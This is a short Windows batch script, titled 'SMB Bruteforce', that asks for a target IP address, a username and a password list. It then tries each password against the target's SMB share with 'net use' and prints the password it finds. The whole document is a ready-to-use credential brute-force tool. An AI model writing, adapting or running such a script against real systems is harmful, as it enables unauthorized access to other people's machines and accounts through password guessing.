@echo off
title SMB Bruteforce - Alexandre MARTEL
color A

set /p ip="Enter IP Adress : "
set /p user="Enter Username : "
set /p wordlist="Enter Password_list : "

set /a count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)
echo Password not found :/
pause 
exit

:success
echo.
echo Password found : %pass%
net use \\%ip% /d /y >nul 2>& 1
pause 
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>& 1
echo [ATTEMPT %count%] [%pass%]
set /a count = %count% +1
if %errorlevel% EQU 0 goto success


